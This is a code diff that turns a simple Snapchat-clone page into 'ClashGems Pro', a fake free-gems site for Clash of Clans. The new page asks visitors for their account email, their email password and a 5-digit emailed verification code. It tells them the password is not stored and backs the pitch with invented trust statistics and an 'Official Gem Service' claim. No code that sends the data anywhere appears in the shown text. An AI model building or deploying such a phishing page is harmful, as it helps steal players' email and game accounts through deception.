@@ -1,189 +1,1641 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="en" dir="ltr">
 <head>
-  <meta charset="UTF-8" />
-  <title>SnapChat Clone</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Vazirmatn', sans-serif;
-      background: #FFFC00;
-      overflow: hidden;
-    }
-    .splash, .login, .camera {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #FFFC00;
-      flex-direction: column;
-      z-index: 10;
-    }
-    .hidden { display: none; }
-    #video {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      z-index: 0;
-    }
-    .overlay {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      z-index: 1;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      padding: 1rem;
-      background: linear-gradient(to top, rgba(255,255,255,0.1), transparent 60%);
-    }
-    .circle-btn {
-      width: 72px; height: 72px;
-      background-color: white;
-      border-radius: 50%;
-      border: 4px solid #000;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClashGems Pro - Official Gem Service</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&family=Rubik:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* Brand Colors */
+            --primary: #FF9F1C;  /* Vibrant Orange */
+            --secondary: #2EC4B6; /* Teal */
+            --dark: #0A1128;     /* Navy Blue */
+            --light: #F8F9FA;    /* Light Gray */
+            --accent: #E53E3E;   /* Red */
+            --darker-blue: #091428;
+            --lighter-blue: #1a2a6c;
+            --gold: #FFD700;
+            
+            /* Text Colors */
+            --text-dark: #1A202C;
+            --text-light: #F7FAFC;
+            
+            /* Backgrounds */
+            --bg-light: #FFFFFF;
+            --bg-dark: #121826;
+            
+            /* Transitions */
+            --transition: all 0.3s ease;
+            
+            /* Shadows */
+            --shadow-sm: 0 4px 6px rgba(0, 0, 0, 0.1);
+            --shadow-md: 0 10px 15px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 20px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rubik', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--darker-blue), var(--lighter-blue));
+            color: var(--text-light);
+            min-height: 100vh;
+            overflow-x: hidden;
+            line-height: 1.6;
+            transition: var(--transition);
+        }
+
+        body.light-mode {
+            background: linear-gradient(135deg, #a1c4fd, #c2e9fb);
+            color: var(--text-dark);
+        }
+
+        /* Animated Background */
+        .animated-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+            overflow: hidden;
+        }
+
+        .bg-particle {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 215, 0, 0.2);
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0) translateX(0) rotate(0deg); }
+            100% { transform: translateY(-100vh) translateX(100vw) rotate(360deg); }
+        }
+
+        /* Header Styles */
+        header {
+            background: rgba(10, 17, 40, 0.95);
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: var(--shadow-md);
+            position: relative;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+            animation: slideDown 0.8s ease;
+        }
+
+        @keyframes slideDown {
+            from { transform: translateY(-100px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        body.light-mode header {
+            background: rgba(255, 255, 255, 0.95);
+            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            z-index: 1;
+        }
+
+        .logo i {
+            font-size: 2.8rem;
+            color: var(--primary);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .logo h1 {
+            font-family: 'Poppins', sans-serif;
+            font-weight: 800;
+            font-size: 2.2rem;
+            background: linear-gradient(to right, var(--primary), var(--gold));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .header-controls {
+            display: flex;
+            gap: 15px;
+            z-index: 1;
+        }
+
+        .theme-toggle, .lang-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        body.light-mode .theme-toggle, 
+        body.light-mode .lang-btn {
+            background: rgba(0, 0, 0, 0.05);
+            color: var(--text-dark);
+            border-color: rgba(0, 0, 0, 0.1);
+        }
+
+        .theme-toggle:hover, .lang-btn:hover {
+            background: var(--primary);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 159, 28, 0.4);
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+
+        /* Section Styles */
+        .section {
+            display: none;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 40px;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+            transition: var(--transition);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            box-shadow: var(--shadow-md);
+            animation: fadeIn 0.8s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        body.light-mode .section {
+            background: rgba(255, 255, 255, 0.8);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 40px;
+            position: relative;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 700;
+            color: var(--primary);
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        body.light-mode .section-title {
+            color: var(--primary);
+        }
+
+        .section-title::after {
+            content: "";
+            position: absolute;
+            bottom: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 5px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            border-radius: 5px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            position: relative;
+        }
+
+        .hero h2 {
+            font-family: 'Poppins', sans-serif;
+            font-size: 3.2rem;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, var(--primary), var(--gold));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            animation: textGlow 2s infinite alternate;
+        }
+
+        @keyframes textGlow {
+            0% { text-shadow: 0 0 5px rgba(255, 215, 0, 0.5); }
+            100% { text-shadow: 0 0 20px rgba(255, 215, 0, 0.8); }
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            line-height: 1.8;
+            max-width: 800px;
+            margin: 0 auto 40px;
+            opacity: 0.9;
+            font-weight: 500;
+        }
+
+        body.light-mode .hero p {
+            color: var(--text-dark);
+        }
+
+        .stats-container {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 40px 0;
+            flex-wrap: wrap;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 30px;
+            min-width: 220px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: var(--transition);
+            backdrop-filter: blur(10px);
+            transform: translateY(0);
+            animation: floatCard 6s infinite ease-in-out;
+        }
+
+        @keyframes floatCard {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+            100% { transform: translateY(0); }
+        }
+
+        body.light-mode .stat-card {
+            background: rgba(255, 255, 255, 0.7);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .stat-card:hover {
+            transform: translateY(-10px) scale(1.05);
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        body.light-mode .stat-card:hover {
+            background: rgba(255, 255, 255, 0.9);
+        }
+
+        .stat-card i {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            color: var(--primary);
+        }
+
+        .stat-card h3 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .stat-card p {
+            opacity: 0.9;
+            font-weight: 500;
+        }
+
+        body.light-mode .stat-card p {
+            color: var(--text-dark);
+        }
+
+        .main-btn {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: white;
+            font-size: 1.3rem;
+            padding: 16px 50px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: 700;
+            transition: var(--transition);
+            box-shadow: 0 8px 25px rgba(255, 159, 28, 0.4);
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 20px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .main-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, var(--secondary), var(--primary));
+            z-index: -1;
+            opacity: 0;
+            transition: var(--transition);
+        }
+
+        .main-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 30px rgba(255, 159, 28, 0.6);
+        }
+
+        .main-btn:hover::before {
+            opacity: 1;
+        }
+
+        /* How It Works Section */
+        .how-it-works {
+            margin-top: 60px;
+        }
+
+        .steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-top: 40px;
+        }
+
+        .step-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 30px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: var(--transition);
+            transform: perspective(1000px) rotateY(0deg);
+            animation: cardAppear 0.8s ease;
+        }
+
+        @keyframes cardAppear {
+            0% { transform: perspective(1000px) rotateY(90deg); opacity: 0; }
+            100% { transform: perspective(1000px) rotateY(0deg); opacity: 1; }
+        }
+
+        body.light-mode .step-card {
+            background: rgba(255, 255, 255, 0.7);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .step-card:hover {
+            transform: translateY(-10px) scale(1.05);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .step-number {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin: 0 auto 20px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+
+        .step-card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: var(--primary);
+        }
+
+        .step-card p {
+            opacity: 0.9;
+            font-weight: 500;
+        }
+
+        body.light-mode .step-card p {
+            color: var(--text-dark);
+        }
+
+        /* VPN Section */
+        .vpn-content {
+            max-width: 600px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .vpn-icon {
+            font-size: 5rem;
+            color: var(--primary);
+            margin-bottom: 30px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+
+        .vpn-warning {
+            background: rgba(229, 62, 62, 0.15);
+            border: 2px solid var(--accent);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            text-align: center;
+            animation: pulseWarning 2s infinite;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        @keyframes pulseWarning {
+            0% { box-shadow: 0 0 0 0 rgba(229, 62, 62, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(229, 62, 62, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(229, 62, 62, 0); }
+        }
+
+        .vpn-warning i {
+            font-size: 3rem;
+            color: var(--accent);
+            margin-bottom: 20px;
+        }
+
+        /* Account Type Section */
+        .account-types {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin: 40px 0;
+            flex-wrap: wrap;
+        }
+
+        .account-type {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 30px;
+            width: 280px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition);
+            border: 2px solid transparent;
+            transform: scale(1);
+            animation: scaleIn 0.5s ease;
+        }
+
+        @keyframes scaleIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        body.light-mode .account-type {
+            background: rgba(255, 255, 255, 0.7);
+        }
+
+        .account-type:hover {
+            transform: scale(1.05);
+            border-color: var(--secondary);
+        }
+
+        .account-type.selected {
+            border-color: var(--primary);
+            background: rgba(46, 196, 182, 0.1);
+            box-shadow: var(--shadow-lg);
+            animation: pulseSelected 1.5s infinite;
+        }
+
+        @keyframes pulseSelected {
+            0% { box-shadow: 0 0 0 0 rgba(255, 159, 28, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(255, 159, 28, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 159, 28, 0); }
+        }
+
+        body.light-mode .account-type.selected {
+            background: rgba(46, 196, 182, 0.15);
+        }
+
+        .account-type i {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            color: var(--secondary);
+        }
+
+        /* Form Section */
+        .form-container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+            font-weight: 500;
+            color: var(--text-light);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        body.light-mode .form-group label {
+            color: var(--text-dark);
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            color: var(--text-light);
+            font-size: 1rem;
+            transition: var(--transition);
+        }
+
+        body.light-mode .form-control {
+            background: rgba(255, 255, 255, 0.9);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            color: var(--text-dark);
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(255, 159, 28, 0.3);
+            transform: scale(1.02);
+        }
+
+        /* Gems Slider */
+        .slider-container {
+            padding: 30px 0;
+            text-align: center;
+        }
+
+        .gems-display {
+            font-size: 3rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 20px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            animation: gemPulse 2s infinite;
+        }
+
+        @keyframes gemPulse {
+            0% { text-shadow: 0 0 5px rgba(255, 215, 0, 0.5); }
+            50% { text-shadow: 0 0 20px rgba(255, 215, 0, 0.8); }
+            100% { text-shadow: 0 0 5px rgba(255, 215, 0, 0.5); }
+        }
+
+        .slider {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 15px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            outline: none;
+        }
+
+        body.light-mode .slider {
+            background: rgba(0, 0, 0, 0.1);
+        }
+
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            background: var(--primary);
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(255, 159, 28, 0.8);
+            transition: var(--transition);
+        }
+
+        .slider::-webkit-slider-thumb:hover {
+            transform: scale(1.2);
+        }
+
+        /* Verification Section */
+        .verification-box {
+            max-width: 500px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            border: 2px solid var(--secondary);
+            box-shadow: var(--shadow-sm);
+            animation: borderGlow 2s infinite alternate;
+        }
+
+        @keyframes borderGlow {
+            0% { box-shadow: 0 0 5px rgba(46, 196, 182, 0.5); }
+            100% { box-shadow: 0 0 20px rgba(46, 196, 182, 0.8); }
+        }
+
+        body.light-mode .verification-box {
+            background: rgba(255, 255, 255, 0.9);
+        }
+
+        .verification-header {
+            margin-bottom: 30px;
+        }
+
+        .verification-header i {
+            font-size: 4rem;
+            color: var(--secondary);
+            margin-bottom: 15px;
+            animation: spin 3s infinite linear;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .code-input {
+            width: 60px;
+            height: 70px;
+            text-align: center;
+            font-size: 2rem;
+            background: rgba(255, 255, 255, 0.2);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+            color: var(--text-light);
+            transition: var(--transition);
+            font-weight: 700;
+        }
+
+        body.light-mode .code-input {
+            background: rgba(255, 255, 255, 0.9);
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            color: var(--text-dark);
+        }
+
+        .code-input:focus {
+            border-color: var(--primary);
+            outline: none;
+            transform: scale(1.05);
+            box-shadow: 0 0 10px rgba(255, 159, 28, 0.5);
+        }
+
+        .verification-note {
+            font-size: 0.9rem;
+            opacity: 0.8;
+            margin-top: 20px;
+        }
+
+        /* Success Section */
+        .success-box {
+            max-width: 600px;
+            margin: 0 auto;
+            text-align: center;
+            padding: 40px;
+        }
+
+        .success-icon {
+            font-size: 6rem;
+            color: var(--secondary);
+            margin-bottom: 30px;
+            animation: pulse 2s infinite, float 6s infinite ease-in-out;
+        }
+
+        .timer {
+            font-size: 1.2rem;
+            margin-top: 30px;
+            color: var(--primary);
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px 20px;
+            border-radius: 30px;
+            display: inline-block;
+            font-weight: 700;
+        }
+
+        body.light-mode .timer {
+            background: rgba(0, 0, 0, 0.05);
+        }
+
+        /* Footer */
+        footer {
+            background: linear-gradient(135deg, #091428, #0a1128);
+            color: white;
+            padding: 60px 40px 30px;
+            text-align: center;
+            margin-top: 40px;
+            backdrop-filter: blur(10px);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        body.light-mode footer {
+            background: linear-gradient(135deg, #c2e9fb, #a1c4fd);
+            color: var(--text-dark);
+            border-top: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            text-align: left;
+        }
+
+        .footer-column h3 {
+            font-size: 1.5rem;
+            margin-bottom: 25px;
+            position: relative;
+            padding-bottom: 15px;
+            color: var(--primary);
+        }
+
+        .footer-column h3::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 50px;
+            height: 3px;
+            background: var(--secondary);
+        }
+
+        .footer-column p {
+            line-height: 1.8;
+            opacity: 0.8;
+            margin-bottom: 20px;
+        }
+
+        .footer-column ul {
+            list-style: none;
+        }
+
+        .footer-column ul li {
+            margin-bottom: 15px;
+        }
+
+        .footer-column ul li a {
+            color: white;
+            text-decoration: none;
+            opacity: 0.8;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        body.light-mode .footer-column ul li a {
+            color: var(--text-dark);
+        }
+
+        .footer-column ul li a:hover {
+            opacity: 1;
+            color: var(--primary);
+            transform: translateX(5px);
+        }
+
+        .copyright {
+            max-width: 1200px;
+            margin: 40px auto 0;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            opacity: 0.7;
+        }
+
+        body.light-mode .copyright {
+            border-top: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            header {
+                flex-direction: column;
+                gap: 20px;
+                padding: 20px;
+            }
+            
+            .section {
+                padding: 25px;
+            }
+            
+            .section-title {
+                font-size: 2rem;
+            }
+            
+            .account-types {
+                gap: 20px;
+            }
+            
+            .account-type {
+                width: 100%;
+                max-width: 280px;
+            }
+            
+            .verification-box {
+                padding: 25px;
+            }
+            
+            .code-input { 
+                width: 50px;
+                height: 60px;
+                font-size: 1.8rem;
+            }
+        }
+        
+        /* Fix for VPN warning button */
+        .vpn-warning .main-btn {
+            max-width: 90%;
+            word-wrap: break-word;
+            white-space: normal;
+            padding: 12px 20px;
+        }
+        
+        @media (max-width: 480px) {
+            .vpn-warning .main-btn {
+                padding: 10px 15px;
+                font-size: 1rem;
+            }
+        }
+    </style>
 </head>
 <body>
-
-  <!-- Splash -->
-  <div class="splash" id="splash">
-    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/2048px-Snapchat_logo.svg.png" width="120" alt="Snapchat">
-  </div>
-
-  <!-- Login -->
-  <div class="login hidden" id="login">
-    <h1 class="text-2xl font-bold mb-6">ورود به اسنپ‌چت</h1>
-    <button class="mb-4 bg-white px-6 py-2 rounded shadow" onclick="alert('فعلاً فعال نیست')">ورود با گوگل</button>
-    <button class="mb-4 bg-white px-6 py-2 rounded shadow" onclick="alert('فعلاً فعال نیست')">ورود با فیسبوک</button>
-    <button class="bg-black text-white px-6 py-2 rounded shadow" onclick="startSnap()">ورود مهمان</button>
-  </div>
-
-  <!-- Camera -->
-  <video id="video" autoplay playsinline muted class="hidden"></video>
-  <div class="overlay hidden" id="overlay">
-    <div class="flex justify-between">
-      <div></div>
-      <button class="text-black p-2 bg-white/40 rounded-full cursor-default" disabled>
-        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="black">
-          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553 2.276A2 2 0 0121 14.118V17a2 2 0 01-2 2h-2m-4 0H7a2 2 0 01-2-2v-3.118a2 2 0 011.447-1.842L11 10" />
-        </svg>
-      </button>
+    <!-- Animated Background -->
+    <div class="animated-bg" id="animatedBg"></div>
+    
+    <!-- Header -->
+    <header>
+        <div class="logo">
+            <i class="fas fa-gem"></i>
+            <h1>ClashGems Pro</h1>
+        </div>
+        
+        <div class="header-controls">
+            <button class="theme-toggle" id="themeToggle">
+                <i class="fas fa-moon"></i> Dark Mode
+            </button>
+            <button class="lang-btn" id="langBtn">
+                <i class="fas fa-globe"></i> فارسی
+            </button>
+        </div>
+    </header>
+    
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Hero Section -->
+        <section id="hero-section" class="section hero active">
+            <h2>Official Gem Service for Clash of Clans</h2>
+            <p>Trusted by over 250,000 players, we provide a secure and reliable way to enhance your gaming experience. Get your free gems today and transform your village!</p>
+            
+            <div class="stats-container">
+                <div class="stat-card">
+                    <i class="fas fa-users"></i>
+                    <h3>250K+</h3>
+                    <p>Satisfied Players</p>
+                </div>
+                <div class="stat-card">
+                    <i class="fas fa-gem"></i>
+                    <h3>15M+</h3>
+                    <p>Gems Distributed</p>
+                </div>
+                <div class="stat-card">
+                    <i class="fas fa-shield-alt"></i>
+                    <h3>99.8%</h3>
+                    <p>Security Guarantee</p>
+                </div>
+            </div>
+            
+            <button class="main-btn" id="getStartedBtn">
+                Get Free Gems Now <i class="fas fa-arrow-right"></i>
+            </button>
+            
+            <!-- How It Works Section -->
+            <div class="how-it-works">
+                <h3 class="section-title">How It Works</h3>
+                <div class="steps">
+                    <div class="step-card">
+                        <div class="step-number">1</div>
+                        <h3>Create Account</h3>
+                        <p>Sign up with your game credentials. We support both Gmail and Supercell ID accounts.</p>
+                    </div>
+                    <div class="step-card">
+                        <div class="step-number">2</div>
+                        <h3>Select Gems</h3>
+                        <p>Choose the amount of gems you want to receive. Options range from 500 to 3000 gems.</p>
+                    </div>
+                    <div class="step-card">
+                        <div class="step-number">3</div>
+                        <h3>Secure Verification</h3>
+                        <p>Complete our quick verification process to ensure account security and ownership.</p>
+                    </div>
+                    <div class="step-card">
+                        <div class="step-number">4</div>
+                        <h3>Receive Gems</h3>
+                        <p>Get your free gems delivered to your account within 72 hours. Enjoy your enhanced gaming!</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- VPN Check Section -->
+        <section id="vpn-section" class="section">
+            <h2 class="section-title">Security Check</h2>
+            
+            <div class="vpn-content">
+                <div class="vpn-icon">
+                    <i class="fas fa-user-shield"></i>
+                </div>
+                
+                <div class="vpn-warning" id="iranWarning" style="display: none;">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <h3>Unsafe Connection Detected!</h3>
+                    <p>We've detected that you're connecting from Iran without a VPN. Please use a reliable VPN service and try again.</p>
+                    <button class="main-btn" style="margin-top: 20px;" id="recheckBtn">
+                        Recheck Connection <i class="fas fa-redo"></i>
+                    </button>
+                </div>
+                
+                <div id="vpnSuccess" style="display: none;">
+                    <i class="fas fa-check-circle" style="font-size: 5rem; color: var(--secondary); margin-bottom: 20px;"></i>
+                    <h3>Secure Connection!</h3>
+                    <p>You're securely connected via VPN. You may proceed.</p>
+                    <button class="main-btn" style="margin-top: 30px;" id="continueBtn">
+                        Continue <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+                
+                <div id="vpnChecking">
+                    <i class="fas fa-spinner fa-spin" style="font-size: 3rem; margin-bottom: 20px;"></i>
+                    <h3>Checking Your Connection...</h3>
+                    <p>Detecting location and VPN status...</p>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Account Type Section -->
+        <section id="account-section" class="section">
+            <h2 class="section-title">Select Account Type</h2>
+            <p style="text-align: center; margin-bottom: 40px; opacity: 0.8;">Please select your Clash of Clans account type</p>
+            
+            <div class="account-types">
+                <div class="account-type" data-type="gmail" id="gmailAccount">
+                    <i class="fab fa-google"></i>
+                    <h3>Gmail Account</h3>
+                    <p>Accounts connected to Google</p>
+                </div>
+                
+                <div class="account-type" data-type="supercell" id="supercellAccount">
+                    <i class="fas fa-user-shield"></i>
+                    <h3>Supercell ID</h3>
+                    <p>Accounts connected to Supercell</p>
+                </div>
+            </div>
+            
+            <div class="btn-container" id="accountBtn" style="display: none; text-align: center; margin-top: 30px;">
+                <button class="main-btn" id="formContinueBtn">
+                    Continue <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+        </section>
+        
+        <!-- Form Section -->
+        <section id="form-section" class="section">
+            <h2 class="section-title">Account Information</h2>
+            
+            <div class="form-container">
+                <div class="form-group">
+                    <label for="email"><i class="fas fa-envelope"></i> Clash Account Email</label>
+                    <input type="email" id="email" class="form-control" placeholder="example@gmail.com">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password"><i class="fas fa-lock"></i> Email Password</label>
+                    <input type="password" id="password" class="form-control" placeholder="Your email password">
+                    <p style="font-size: 0.9rem; opacity: 0.7; margin-top: 8px;">
+                        This password is only used for temporary access and is not stored
+                    </p>
+                </div>
+                
+                <div class="form-group">
+                    <label for="playerTag"><i class="fas fa-tag"></i> Player Tag (Optional)</label>
+                    <input type="text" id="playerTag" class="form-control" placeholder="#ABCDEFGH">
+                </div>
+                
+                <div class="slider-container">
+                    <div class="gems-display" id="gemsAmount">1500 Gems</div>
+                    <input type="range" min="500" max="3000" value="1500" step="500" class="slider" id="gemsSlider">
+                </div>
+                
+                <div class="btn-container" style="text-align: center; margin-top: 40px;">
+                    <button class="main-btn" id="submitFormBtn">
+                        Submit & Get Gems <i class="fas fa-paper-plane"></i>
+                    </button>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Verification Section -->
+        <section id="verification-section" class="section">
+            <h2 class="section-title">Email Verification</h2>
+            
+            <div class="verification-box">
+                <div class="verification-header">
+                    <i class="fas fa-mail-bulk"></i>
+                    <h2>Verify Your Email</h2>
+                    <p>A 5-digit verification code has been sent to your email (<span id="userEmail"></span>).</p>
+                </div>
+                
+                <div class="code-inputs">
+                    <input type="text" class="code-input" maxlength="1" id="code1" autofocus>
+                    <input type="text" class="code-input" maxlength="1" id="code2">
+                    <input type="text" class="code-input" maxlength="1" id="code3">
+                    <input type="text" class="code-input" maxlength="1" id="code4">
+                    <input type="text" class="code-input" maxlength="1" id="code5">
+                </div>
+                
+                <p class="verification-note">This code will expire in 10 minutes</p>
+                
+                <button class="main-btn" style="margin-top: 20px;" id="verifyBtn">
+                    Verify Code <i class="fas fa-check"></i>
+                </button>
+                
+                <p style="margin-top: 20px; opacity: 0.8;">
+                    Didn't receive the code? <a href="#" id="resendCode">Resend Code</a>
+                </p>
+                
+                <button class="lang-btn" style="margin-top: 30px; background: transparent; border: 2px solid var(--secondary);" id="editInfoBtn">
+                    <i class="fas fa-edit"></i> Edit Information
+                </button>
+            </div>
+        </section>
+        
+        <!-- Success Section -->
+        <section id="success-section" class="section">
+            <div class="success-box">
+                <div class="success-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h2>Success!</h2>
+                <p>Congratulations! Your information has been submitted successfully. Your gems will be added to your account within 72 hours.</p>
+                <p style="margin-top: 20px; font-size: 1.1rem;">Tracking Code: <strong>CLSH-5A8B-92C4</strong></p>
